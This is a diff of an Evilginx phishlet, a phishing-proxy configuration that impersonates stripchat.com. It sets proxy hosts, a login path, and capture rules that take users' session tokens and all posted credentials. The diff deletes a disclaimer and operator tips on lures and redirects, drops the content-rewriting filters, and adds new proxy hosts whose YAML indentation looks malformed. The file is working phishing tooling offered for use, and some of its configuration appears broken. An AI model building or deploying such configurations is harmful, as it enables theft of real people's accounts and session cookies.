@@ -1,30 +1,12 @@
-# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
-# PLEASE DO NOT MISUSE THIS PHISHLET.
 
-# Don't Forget To set "next_lure" Params to your second lure ( Just to redirect user on failed captcha)
-
-# Use This Command To set the domain params from the evilginx command line.
-# Where ID is lure id number, and  "https://mylure.com/tyghh" is the another lure of evilginx for same phishlet.
-# Use shortened URL from the another lure , And then add that shortened url as "next_lure" parameter
-# lures edit params ID next_lure=https://mylure.com/tyghh
- 
-#Always use shortned url's to add in redirect_url in lures, ( There is a login issue in evilginx, Which sometime fails to redirect if you uses same domain as in hosts list, So use shortened urls of your redirect path)
-
-author: '@mansteve'
+author: '@luffy'
 min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'stripchat.com', session: true, is_landing: true}
+ 
+  - {phish_sub: 'sv', orig_sub: 'sv', domain: 'stripchat.com', session: true, is_landing: true, auto_filter: true}
+  
+    - {phish_sub: 'www', orig_sub: 'www', domain: 'stripchat.com', session: false, is_landing: false, auto_filter: true}
 
-
-sub_filters:
-  - {triggers_on: 'stripchat.com', orig_sub: '', domain: 'stripchat.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'stripchat.com', orig_sub: '', domain: 'stripchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'stripchat.com', orig_sub: '', domain: 'stripchat.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.stripchat.com', orig_sub: '', domain: 'stripchat.com', search: '{hostname_regex}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-  - {triggers_on: 'www.stripchat.com', orig_sub: '', domain: 'stripchat.com', search: '{hostname_regex}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-  - {triggers_on: 'www.stripchat.com', orig_sub: '', domain: 'stripchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-  - {triggers_on: 'www.stripchat.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.stripchat.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   
 auth_tokens:
   - domain: '.stripchat.com'
@@ -41,7 +23,7 @@ credentials:
     search: '(.*)'
     type: 'post'    
 login:
-  domain: 'www.stripchat.com'
+  domain: 'sv.stripchat.com'
   path: '/login'
     
 
